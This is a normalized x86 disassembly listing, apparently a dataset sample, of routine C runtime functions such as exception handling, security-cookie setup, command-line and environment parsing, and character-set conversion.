mov [ edx + 0x4 ] ebx
mov ebx [ ebp - 0x2e4 ]
mov edx [ ebp - 0x2cc ]
mov [ ebp - 0x2d8 ] eax
mov [ ebp - 0x2bc ] ecx
cmp ecx 0x5
jl r-xdata
mov edx [ ebp - 0x2cc ]
cmp edx 0x2
jne r-xdata
imul edx edx 0xc
push edi
call [ edx + r--data ]
test eax eax
mov eax [ ebp - 0x2e0 ]
pop ecx
je r-xdata
mov eax [ ebp - 0x2d4 ]
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x2bc ]
mov ecx [ ebp - 0x2c0 ]
mov ecx [ ebp - 0x2c0 ]
mov eax [ ebp - 0x2bc ]
mov ebx [ ebp - 0x2d8 ]
mov eax [ ecx + eax * 8 ]
mov [ ecx ] eax
mov eax [ ebp - 0x2bc ]
mov eax [ ecx + eax * 8 + 0x4 ]
mov [ ecx + 0x4 ] eax
mov eax [ ebp - 0x2bc ]
mov [ ecx + eax * 8 ] ebx
mov ebx [ ebp - 0x2d0 ]
mov [ ecx + eax * 8 + 0x4 ] ebx
mov ebx [ ebp - 0x2e4 ]
jmp r-xdata
mov edx [ ebp - 0x2c8 ]
mov eax [ edi + 0x4 ]
cmp eax [ edx ]
mov edx [ ebp - 0x2cc ]
je r-xdata
cmp eax rw-data
je r-xdata
mov [ ebx + edi + 0x14 ] eax
mov ebx [ ebp - 0x2c4 ]
push [ ebx ]
call sub_422732
mov eax [ ebp - 0x2ec ]
mov [ ebx ] eax
mov eax [ ebp - 0x2dc ]
push eax
call sub_422732
mov eax [ ebp - 0x2e8 ]
pop ecx
pop ecx
mov [ edi + 0x4 ] eax
jmp r-xdata
mov eax [ ecx + 0x4 ]
mov [ edi + 0x70 ] eax
jmp r-xdata
push 0x1
push [ edi + 0x4 ]
lea eax [ ebp - 0x20c ]
push eax
push 0x7f
push r--data
push 0x1
push esi
call sub_43180c
add esp 0x1c
test eax eax
je r-xdata
cmp eax 0x5
jne r-xdata
mov eax [ ebp - 0x2dc ]
mov [ eax ] 0x1
mov [ ebx + edi + 0x1c ] eax
jmp r-xdata
push [ ebx + edi + 0x1c ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x2c0 ]
mov [ ecx + 0x4 ] esi
mov eax esi
push [ ebx + edi + 0x1c ]
call sub_422732
push [ ebx + edi + 0x18 ]
call sub_422732
mov eax [ ebp - 0x2c4 ]
push [ eax ]
call sub_422732
mov eax [ ebp - 0x2c4 ]
mov [ ebx + edi + 0x14 ] esi
add esp 0xc
mov [ eax ] esi
mov ecx 0x1ff
and [ ebp + eax * 2 - 0x20c ] cx
inc eax
cmp eax 0x7f
jb r-xdata
push 0xfe
push [ rw-data ]
lea eax [ ebp - 0x20c ]
push eax
call sub_427d98
mov ecx [ ebp - 0x2c0 ]
add esp 0xc
neg eax
sbb eax eax
inc eax
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov eax [ edi + 0x4 ]
mov edx [ ebp - 0x2cc ]
mov [ ecx ] eax
sub_43094a
push ebp
mov ebp esp
mov eax 0xffff
sub esp 0x14
cmp [ ebp + 0x8 ] ax
je r-xdata
leave
retn
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x14 ]
call sub_4247f2
mov esi [ ebp - 0x14 ]
mov eax [ esi + 0xa8 ]
test eax eax
jne r-xdata
mov edx 0x100
push 0x1
cmp [ ebp + 0x8 ] dx
jae r-xdata
mov ecx [ ebp + 0x8 ]
lea eax [ ecx - 0x41 ]
cmp ax 0x19
ja r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push edx
push eax
call sub_4297c9
add esp 0x18
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
call sub_4353ac
pop ecx
pop ecx
test eax eax
jne r-xdata
movzx eax cx
movzx eax ax
jmp r-xdata
add cx 0x20
movzx eax [ ebp - 0x4 ]
movzx eax [ ebp + 0x8 ]
movzx ecx [ ebp + 0x8 ]
mov eax [ esi + 0x94 ]
movzx eax [ eax + ecx ]
movzx eax [ ebp + 0x8 ]
movzx eax ax
jmp r-xdata
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x8 ] 0x0
pop esi
je r-xdata
movzx eax ax
jmp r-xdata
movzx eax ax
jmp r-xdata
sub_430a04
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn 0x4
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov eax [ eax + 0x14 ]
cmp eax 0x19930520
je r-xdata
call sub_42e188
cmp eax 0x19930521
je r-xdata
cmp eax 0x19930522
je r-xdata
cmp eax 0x1994000
je r-xdata
sub_430a53
push ebp
mov ebp esp
push esi
call sub_42f50e
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov edx [ esi + 0x5c ]
push edi
mov edi [ ebp + 0x8 ]
mov ecx edx
lea eax [ edx + 0x90 ]
cmp ecx eax
jae r-xdata
add ecx 0xc
lea eax [ edx + 0x90 ]
cmp ecx eax
jb r-xdata
xor ecx ecx
cmp [ ecx ] edi
je r-xdata
cmp [ ecx ] edi
je r-xdata
xor eax eax
mov edx [ ecx + 0x8 ]
test edx edx
je r-xdata
test ecx ecx
je r-xdata
cmp edx 0x5
jne r-xdata
cmp edx 0x1
jne r-xdata
and [ ecx + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ esi + 0x60 ]
mov [ esi + 0x60 ] eax
cmp [ ecx + 0x4 ] 0x8
jne r-xdata
or eax 0xffffffff
jmp r-xdata
pop edi
push [ ecx + 0x4 ]
and [ ecx + 0x8 ] 0x0
call edx
push 0x24
pop edi
mov eax [ esi + 0x5c ]
add edi 0xc
and [ edi + eax - 0x4 ] 0x0
cmp edi 0x90
jl r-xdata
cmp [ ecx ] 0xc000008e
mov edi [ esi + 0x64 ]
jne r-xdata
cmp [ ecx ] 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
cmp [ ecx ] 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call edx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp [ ecx ] 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
pop ecx
mov [ esi + 0x60 ] ebx
or eax 0xffffffff
pop ebx
jmp r-xdata
cmp [ ecx ] 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp [ ecx ] 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp [ ecx ] 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
cmp [ ecx ] 0xc00002b5
jne r-xdata
mov [ esi + 0x64 ] 0x8a
jmp r-xdata
cmp [ ecx ] 0xc00002b4
jne r-xdata
mov [ esi + 0x64 ] 0x8d
jmp r-xdata
mov [ esi + 0x64 ] 0x8e
sub_430bae
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
push 0x104
mov ebx rw-data
push ebx
xor eax eax
xor edi edi
push edi
mov [ rw-data ] ax
call [ GetModuleFileNameW@IAT ]
mov esi [ rw-data ]
mov [ rw-data ] ebx
test esi esi
je r-xdata
mov esi ebx
cmp [ esi ] di
jne r-xdata
or eax 0xffffffff
mov eax [ ebp - 0x8 ]
cmp eax 0x7fffffff
jae r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push edi
push edi
push esi
call sub_430c5a
mov ebx [ ebp - 0x4 ]
add esp 0x14
cmp ebx 0x3fffffff
jae r-xdata
lea ecx [ eax + ebx * 2 ]
add ecx ecx
add eax eax
cmp ecx eax
jb r-xdata
push ecx
call sub_4266f1
mov edi eax
pop ecx
test edi edi
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
lea eax [ edi + ebx * 4 ]
push eax
push edi
push esi
call sub_430c5a
mov eax [ ebp - 0x4 ]
add esp 0x14
dec eax
mov [ rw-data ] eax
mov [ rw-data ] edi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_430c5a
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0x18 ]
push esi
mov esi [ ebp + 0xc ]
push edi
xor edi edi
mov [ ebx ] edi
mov [ eax ] 0x1
test esi esi
je r-xdata
mov [ ebp + 0x8 ] 0x20
mov [ ebp - 0x4 ] 0x9
mov [ esi ] edx
add esi 0x4
mov [ ebp + 0xc ] esi
inc [ ebx ]
test edx edx
je r-xdata
xor eax eax
test edi edi
sete al
push 0x22
add ecx 0x2
mov edi eax
pop eax
jmp r-xdata
movzx eax [ ecx ]
add ecx 0x2
test ax ax
je r-xdata
mov ax [ ecx ]
mov [ edx ] ax
add edx 0x2
test edi edi
jne r-xdata
sub ecx 0x2
push 0x22
pop eax
cmp [ ecx ] ax
jne r-xdata
cmp ax [ ebp + 0x8 ]
je r-xdata
test esi esi
je r-xdata
movzx eax [ ecx ]
cmp ax [ ebp + 0x8 ]
je r-xdata
test edx edx
je r-xdata
cmp ax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp + 0x14 ]
pop edi
inc [ eax ]
pop esi
pop ebx
leave
retn
mov [ esi ] ebx
add ecx 0x2
jmp r-xdata
cmp ax [ ebp - 0x4 ]
jne r-xdata
mov edi [ ebp + 0x18 ]
xor ebx ebx
mov [ ebp - 0x8 ] ebx
xor eax eax
mov [ edx - 0x2 ] ax
jmp r-xdata
cmp [ ecx ] bx
je r-xdata
test esi esi
je r-xdata
mov eax [ ebp + 0x14 ]
mov esi [ ebp - 0x8 ]
inc [ eax ]
mov [ esi ] edx
add esi 0x4
mov [ ebp + 0xc ] esi
cmp [ ecx ] ax
je r-xdata
add ecx 0x2
inc ebx
push 0x22
pop eax
cmp [ ecx ] ax
push 0x5c
pop eax
jne r-xdata
test ebx ebx
jne r-xdata
test bl 0x1
jne r-xdata
dec ebx
test edx edx
je r-xdata
movzx eax [ ecx ]
test ax ax
je r-xdata
shr ebx 0x1
jmp r-xdata
test esi esi
je r-xdata
inc [ edi ]
mov [ edx ] ax
add edx 0x2
mov [ ebp - 0x8 ] esi
mov esi [ ebp + 0xc ]
test edx edx
je r-xdata
test esi esi
jne r-xdata
and [ ebp - 0x8 ] 0x0
xor eax eax
test esi esi
sete al
mov esi eax
push 0x22
pop edi
cmp [ ecx + 0x2 ] di
mov edi [ ebp + 0x18 ]
jne r-xdata
inc [ edi ]
xor ebx ebx
jmp r-xdata
xor eax eax
mov [ edx ] ax
add edx 0x2
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp ax [ ebp + 0x8 ]
je r-xdata
add ecx 0x2
jmp r-xdata
cmp [ ecx ] bx
je r-xdata
add ecx 0x2
xor ebx ebx
jmp r-xdata
test edx edx
je r-xdata
cmp ax [ ebp - 0x4 ]
je r-xdata
push 0x5c
pop eax
push 0x5c
mov [ ebp - 0x8 ] 0x1
pop eax
jmp r-xdata
inc [ edi ]
mov [ edx ] ax
add edx 0x2
sub_430de7
push ebx
push esi
mov esi [ rw-data ]
xor ebx ebx
push edi
mov edi ebx
test esi esi
jne r-xdata
movzx eax [ esi ]
push 0x3d
pop ecx
test ax ax
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp ax cx
je r-xdata
lea eax [ edi + 0x1 ]
push 0x4
push eax
call sub_4266a7
mov edi eax
pop ecx
pop ecx
mov [ rw-data ] edi
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
push esi
call sub_427b65
lea esi [ esi + eax * 2 ]
pop ecx
add esi 0x2
inc edi
mov esi [ rw-data ]
cmp [ esi ] bx
je r-xdata
push esi
call sub_422732
mov [ rw-data ] ebx
mov [ edi ] ebx
mov [ rw-data ] 0x1
xor eax eax
push esi
call sub_427b65
pop ecx
push 0x3d
lea ebx [ eax + 0x1 ]
pop eax
cmp [ esi ] ax
je r-xdata
lea esi [ esi + ebx * 2 ]
xor ebx ebx
cmp [ esi ] bx
jne r-xdata
push 0x2
push ebx
call sub_4266a7
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
mov esi [ rw-data ]
push [ rw-data ]
call sub_422732
and [ rw-data ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push ebx
push eax
call sub_422868
add esp 0xc
test eax eax
jne r-xdata
pop ecx
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_42a241
int3
add edi 0x4
sub_430ed6
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
js r-xdata
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
or eax 0xffffffff
pop ebp
retn
cmp eax 0x2
jle r-xdata
mov ecx [ rw-data ]
mov [ rw-data ] eax
cmp eax 0x3
jne r-xdata
mov ecx [ rw-data ]
jmp r-xdata
mov eax ecx
pop ebp
retn
sub_430f16
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
push esi
push edi
mov edi 0xbb40e64e
mov esi 0xffff0000
cmp eax edi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov eax [ ebp - 0x8 ]
xor eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
call [ GetCurrentThreadId@IAT ]
xor [ ebp - 0x4 ] eax
call [ GetCurrentProcessId@IAT ]
xor [ ebp - 0x4 ] eax
lea eax [ ebp - 0x14 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov ecx [ ebp - 0x10 ]
xor ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x4 ]
xor ecx [ ebp - 0x4 ]
xor ecx eax
cmp ecx edi
jne r-xdata
test esi eax
je r-xdata
test esi ecx
jne r-xdata
mov ecx 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] ecx
not ecx
mov [ rw-data ] ecx
mov eax ecx
or eax 0x4711
shl eax 0x10
or ecx eax
pop edi
pop esi
leave
retn
sub_430fb0
push ebp
mov ebp esp
push ecx
push edi
call [ GetEnvironmentStringsW@IAT ]
mov edi eax
test edi edi
je r-xdata
pop edi
leave
retn
push ebx
xor ebx ebx
push esi
mov esi edi
cmp [ edi ] bx
je r-xdata
sub esi edi
add esi 0x2
push esi
call sub_4266f1
pop ecx
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
add esi 0x2
cmp [ esi ] bx
jne r-xdata
push edi
call [ FreeEnvironmentStringsW@IAT ]
pop esi
mov eax ebx
pop ebx
push esi
push edi
push eax
call sub_424fc0
mov ebx [ ebp - 0x4 ]
add esp 0xc
add esi 0x2
cmp [ esi ] bx
jne r-xdata
sub_43100b
mov ecx [ rw-data ]
xor edx edx
test ecx ecx
jne r-xdata
push esi
push 0x20
pop esi
mov ecx r--data
cmp eax 0x22
jne r-xdata
test ax ax
je r-xdata
add ecx 0x2
jmp r-xdata
xor eax eax
test edx edx
sete al
mov edx eax
mov eax ecx
pop esi
retn
test edx edx
je r-xdata
movzx eax [ ecx ]
cmp ax si
ja r-xdata
movzx eax [ ecx ]
test ax ax
jne r-xdata
cmp ax si
ja r-xdata
add ecx 0x2
sub_431060
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_433ecc
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_433ecc
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_4310ac
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
sub esp 0x14
push esi
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
test edi edi
je r-xdata
push ebx
mov ebx [ ebp + 0xc ]
test ebx ebx
jne r-xdata
test eax eax
je r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x14 ]
call sub_4247f2
mov eax [ ebp - 0x14 ]
test edi edi
je r-xdata
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
or eax 0xffffffff
jmp r-xdata
pop edi
pop esi
leave
retn
xor eax eax
mov [ edi ] ax
cmp [ eax + 0xa8 ] esi
jne r-xdata
cmp [ eax + 0xa8 ] esi
jne r-xdata
pop ebx
push esi
push esi
or esi 0xffffffff
push esi
push ebx
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_425610
pop ecx
push [ ebp + 0x10 ]
or esi 0xffffffff
push edi
push esi
push ebx
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
cmp [ ebp + 0x10 ] esi
jbe r-xdata
lea esi [ eax - 0x1 ]
call sub_427b11
mov [ eax ] 0x2a
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
movzx eax [ esi + ebx ]
mov [ edi ] ax
cmp [ esi + ebx ] 0x0
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
call sub_427b11
mov [ eax ] 0x2a
xor eax eax
mov [ edi ] ax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov eax ebx
jmp r-xdata
inc esi
add edi 0x2
cmp esi [ ebp + 0x10 ]
jb r-xdata
mov [ ebp + 0x8 ] eax
test ecx ecx
jne r-xdata
jmp r-xdata
dec ecx
mov [ ebp - 0x4 ] ecx
mov cl [ eax ]
test cl cl
je r-xdata
push [ ebp + 0x10 ]
sub eax ebx
push edi
push eax
mov eax [ ebp - 0x14 ]
push ebx
push 0x1
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x14 ]
push eax
movzx eax cl
push eax
call sub_432c17
pop ecx
test eax eax
mov eax [ ebp + 0x8 ]
pop ecx
je r-xdata
mov esi eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
inc eax
inc eax
cmp [ eax ] 0x0
je r-xdata
sub_43120b
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ ebp + 0x10 ]
push esi
push edi
mov edi [ ebp + 0xc ]
xor esi esi
test edi edi
jne r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
je r-xdata
xor eax eax
mov [ edi ] ax
call sub_427b11
push 0x16
pop esi
mov [ eax ] esi
call sub_42a231
jmp r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
jmp r-xdata
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x10 ]
call sub_4247f2
mov eax ebx
cmp [ ebp + 0x18 ] ebx
ja r-xdata
mov [ eax ] esi
pop edi
mov eax esi
pop esi
pop ebx
leave
retn
cmp eax 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x18 ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
push [ ebp + 0x14 ]
push edi
call sub_4310ac
add esp 0x10
cmp eax 0xffffffff
jne r-xdata
call sub_427b11
push 0x16
jmp r-xdata
inc eax
test edi edi
je r-xdata
test edi edi
je r-xdata
pop esi
mov [ eax ] esi
call sub_42a231
jmp r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
cmp eax ebx
jbe r-xdata
call sub_427b11
mov esi [ eax ]
jmp r-xdata
xor eax eax
mov [ edi ] ax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ecx ] eax
xor ecx ecx
mov [ edi + eax * 2 - 0x2 ] cx
cmp [ ebp + 0x18 ] 0xffffffff
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
push 0x50
mov eax ebx
pop esi
xor eax eax
mov [ edi ] ax
call sub_427b11
push 0x22
sub_431305
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
push edi
mov edi [ ebp + 0xc ]
xor esi esi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x10 ] esi
test eax eax
je r-xdata
test edi edi
jne r-xdata
test ebx ebx
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x2c ]
call sub_4247f2
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x2c ]
test ecx ecx
je r-xdata
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
or eax 0xffffffff
jmp r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0xa8 ] esi
jne r-xdata
cmp [ eax + 0xa8 ] esi
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_421ed7
leave
retn
lea ecx [ ebp - 0x10 ]
push ecx
push esi
push esi
push esi
push 0xffffffff
push edi
push esi
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
movzx eax [ edi ]
test ax ax
je r-xdata
cmp [ eax + 0x74 ] 0x1
jne r-xdata
test ebx ebx
je r-xdata
call sub_427b11
mov [ eax ] 0x2a
or edi 0xffffffff
cmp [ ebp - 0x10 ] esi
jne r-xdata
mov edi esi
jmp r-xdata
mov edx 0xff
lea edx [ ebp - 0x10 ]
push edx
push esi
push ebx
push ecx
push 0xffffffff
push edi
push esi
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
mov edi eax
test edi edi
je r-xdata
test ebx ebx
je r-xdata
mov edx 0xff
mov eax edi
mov ecx [ ebp - 0x24 ]
and [ ecx + 0x70 ] 0xfffffffd
lea edi [ eax - 0x1 ]
jmp r-xdata
cmp [ ebp - 0x20 ] 0x0
je r-xdata
add edi 0x2
inc esi
movzx eax [ edi ]
test ax ax
jne r-xdata
cmp [ ebp - 0x10 ] esi
jne r-xdata
cmp [ ebp - 0x10 ] esi
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
push esi
push ebx
push ecx
push ebx
push edi
push esi
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
test esi esi
je r-xdata
mov eax edi
mov edx ebx
call sub_427b11
mov [ eax ] 0x2a
or esi 0xffffffff
jmp r-xdata
mov al [ edi ]
mov [ ecx + esi ] al
mov ax [ edi ]
add edi 0x2
test ax ax
je r-xdata
cmp ax dx
ja r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
lea esi [ edi - 0x1 ]
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
test edx edx
je r-xdata
add eax 0x2
dec edx
jne r-xdata
inc esi
cmp esi ebx
jb r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + esi - 0x1 ] 0x0
jne r-xdata
mov eax [ ebp - 0x2c ]
cmp [ eax ] si
jne r-xdata
cmp [ eax ] si
je r-xdata
cmp [ edi ] dx
ja r-xdata
jmp r-xdata
mov eax [ ebp - 0x14 ]
dec esi
jmp r-xdata
mov ebx eax
sub ebx edi
sar ebx 0x1
inc ebx
cmp [ ebp - 0x10 ] esi
jne r-xdata
test edx edx
js r-xdata
cmp edx 0x5
ja r-xdata
lea eax [ edx + edi ]
cmp eax ebx
ja r-xdata
mov eax esi
mov [ ebp - 0x1c ] eax
test edx edx
jle r-xdata
mov eax [ ebp - 0x14 ]
add eax 0x2
mov [ ebp - 0x14 ] eax
cmp edi ebx
jb r-xdata
mov ecx [ ebp - 0x18 ]
lea ecx [ ebp - 0x10 ]
push ecx
mov ecx [ ebp - 0x2c ]
push esi
push [ ecx + 0x74 ]
lea edx [ ebp - 0xc ]
push edx
push 0x1
push eax
push esi
push [ ecx + 0x4 ]
call [ WideCharToMultiByte@IAT ]
mov edx eax
test edx edx
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x1c ]
inc eax
inc edi
mov [ ebp - 0x1c ] eax
cmp eax edx
jl r-xdata
mov al [ ebp + eax - 0xc ]
mov [ ecx + edi ] al
test al al
je r-xdata
sub_43156a
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
xor eax eax
push edi
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
test esi esi
je r-xdata
test edi edi
je r-xdata
test edi edi
je r-xdata
test esi esi
je r-xdata
call sub_427b11
push 0x16
pop esi
mov [ eax ] esi
call sub_42a231
mov eax esi
jmp r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
mov [ esi ] al
pop edi
pop esi
leave
retn
mov eax edi
cmp [ ebp + 0x18 ] edi
ja r-xdata
mov [ ebx ] eax
cmp eax 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x18 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push esi
call sub_431305
add esp 0x10
cmp eax 0xffffffff
jne r-xdata
call sub_427b11
push 0x16
jmp r-xdata
inc eax
test esi esi
je r-xdata
test esi esi
je r-xdata
pop esi
mov [ eax ] esi
call sub_42a231
mov eax esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
cmp eax edi
jbe r-xdata
call sub_427b11
mov eax [ eax ]
jmp r-xdata
mov [ esi ] 0x0
pop ebx
mov eax ecx
mov [ ebx ] eax
mov ecx [ ebp - 0x4 ]
cmp [ ebp + 0x18 ] 0xffffffff
je r-xdata
test ebx ebx
je r-xdata
push 0x50
mov eax edi
pop ecx
jmp r-xdata
mov [ esi ] 0x0
cmp edi eax
ja r-xdata
mov [ eax + esi - 0x1 ] 0x0
jmp r-xdata
call sub_427b11
push 0x22
sub_431633
push ebp
mov ebp esp
sub esp 0x18
lea ecx [ ebp - 0x18 ]
push ebx
push [ ebp + 0x10 ]
call sub_4247f2
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov eax ebx
sar eax 0x8
mov [ ebp + 0x8 ] eax
lea ecx [ ebp - 0x18 ]
movzx eax al
push ecx
push eax
call sub_432c17
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x90 ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x0
inc ecx
mov eax [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x0
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_43180c
add esp 0x1c
test eax eax
jne r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_4316e2
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push esi
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4318f5
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
mov eax esi
pop esi
leave
retn
cmp [ ebp - 0x4 ] eax
je r-xdata
call sub_427b11
test eax eax
je r-xdata
call sub_427b11
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
sub_431720
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x1c ]
push ebx
push esi
push edi
xor edi edi
test ecx ecx
jne r-xdata
xor eax eax
cmp [ ebp + 0x20 ] eax
push edi
push edi
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push ecx
call [ MultiByteToWideChar@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
mov ecx eax
jle r-xdata
xor eax eax
jmp r-xdata
mov esi edi
cmp ebx 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
leave
retn
lea eax [ ebx + ebx ]
push eax
push edi
push esi
call sub_427900
add esp 0xc
push ebx
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x1c ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
lea eax [ ebx * 2 + 0x8 ]
cmp eax 0x400
ja r-xdata
push esi
call sub_42487a
pop ecx
mov eax edi
push [ ebp + 0x18 ]
push eax
push esi
push [ ebp + 0xc ]
